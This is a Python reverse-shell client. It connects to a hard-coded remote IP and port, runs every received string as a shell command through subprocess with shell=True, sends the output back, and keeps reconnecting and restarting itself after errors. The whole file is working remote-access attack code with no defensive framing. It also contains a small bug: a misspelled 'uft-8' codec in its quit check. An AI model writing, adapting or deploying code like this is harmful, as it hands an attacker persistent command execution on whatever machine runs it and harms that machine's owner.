# coded in python 3

# region Imports
import os
import socket
import subprocess
import time
#endregion

# region Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.43.119'  # Change this to the IP address of the server
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
#endregion

# region Connect to the remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        time.sleep(5)
        socket_connect()

#endregion

#region Receive commands from remote sever and run on local machine
def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode('uft-8') == 'quit':
            s.close()
            break
        if len(data) > 0:
                try: 
                    cmd = subprocess.Popen(data[:].decode("utf-8"),
                                           shell=True,# change this to False to not show the cmd window
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + str(os.getcwd()) + '> ' ))
                    print(output_str) # Print the output (optional)
                except:
                    output_str = "Command not reconized" + '\n'
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
    s.close()
#endregion

# region main function
def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()
#endregion
main()